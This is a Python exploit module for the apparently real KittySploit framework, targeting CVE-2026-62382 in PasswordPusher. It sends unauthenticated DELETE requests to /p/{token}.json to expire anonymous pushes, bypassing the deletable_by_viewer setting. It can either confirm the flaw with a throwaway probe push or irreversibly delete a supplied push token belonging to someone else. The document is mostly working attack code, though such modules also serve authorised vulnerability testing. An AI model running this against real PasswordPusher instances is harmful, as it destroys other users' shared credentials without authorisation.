#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""PasswordPusher CVE-2026-62382 — expire anonymous pushes without authentication."""

import json
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "PasswordPusher CVE-2026-62382 anonymous push delete",
        "description": (
            "Auxiliary for CVE-2026-62382: DELETE /p/{url_token}.json succeeds for anonymous pushes "
            "even when deletable_by_viewer was set to false. Does not yield an application session — "
            "only expires/deletes push content."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-62382"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-62382",
            "https://github.com/pglombardo/PasswordPusher/security/advisories/GHSA-jf2m-hpj9-4qx2",
        ],
        "tags": ["passwordpusher", "authz-bypass", "deletion", "auxiliary", "cve-2026-62382"],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 2,
            "reversible": False,
            "approval_required": True,
            "produces": ["risk_signals", "exploit_paths"],
            "chain": {
                "suggested_followups": [
                    "scanner/http/passwordpusher_cve_2026_62382_detect",
                ],
            },
        },
    }

    url_token = OptString(
        "",
        "Existing push url_token to DELETE (empty = create probe push then delete)",
        required=False,
    )

    def check(self):
        token = (self.url_token or "").strip()
        if token:
            response = self.http_request(
                method="DELETE",
                path=f"/p/{token}.json",
                headers={"Accept": "application/json"},
                allow_redirects=False,
            )
            if response and response.status_code == 200:
                text = response.text or ""
                if "expired" in text and "deleted" in text:
                    return {
                        "vulnerable": True,
                        "reason": f"DELETE accepted for token {token}",
                        "confidence": "high",
                    }
            return {"vulnerable": False, "reason": "DELETE did not confirm expiry", "confidence": "medium"}
        create = self.http_request(
            method="POST",
            path="/p.json",
            headers={"Content-Type": "application/json", "Accept": "application/json"},
            data=json.dumps(
                {
                    "password": {
                        "payload": f"ks-check-{secrets.token_hex(4)}",
                        "deletable_by_viewer": False,
                        "expire_after_views": 5,
                    }
                }
            ),
            allow_redirects=False,
        )
        if not create or create.status_code != 201:
            return {"vulnerable": False, "reason": "Cannot create probe push", "confidence": "low"}
        try:
            token = (json.loads(create.text or "{}").get("url_token") or "").strip()
        except json.JSONDecodeError:
            token = ""
        if not token:
            return {"vulnerable": False, "reason": "No url_token in create response", "confidence": "low"}
        delete = self.http_request(
            method="DELETE",
            path=f"/p/{token}.json",
            headers={"Accept": "application/json"},
            allow_redirects=False,
        )
        ok = (
            delete
            and delete.status_code == 200
            and "expired" in (delete.text or "")
            and "deleted" in (delete.text or "")
        )
        return {
            "vulnerable": bool(ok),
            "reason": "Anonymous push delete bypass confirmed" if ok else "Delete probe failed",
            "confidence": "high" if ok else "medium",
        }

    def run(self):
        chk = self.check()
        if not chk.get("vulnerable"):
            print_error(chk.get("reason"))
            return False
        token = (self.url_token or "").strip()
        if not token:
            print_success("Probe push created and deleted (ownership bypass confirmed)")
            return True
        response = self.http_request(
            method="DELETE",
            path=f"/p/{token}.json",
            headers={"Accept": "application/json"},
            allow_redirects=False,
        )
        if response and response.status_code == 200:
            print_success(f"Push {token} expired/deleted")
            print_status((response.text or "")[:500])
            return True
        print_error("DELETE failed")
        return False
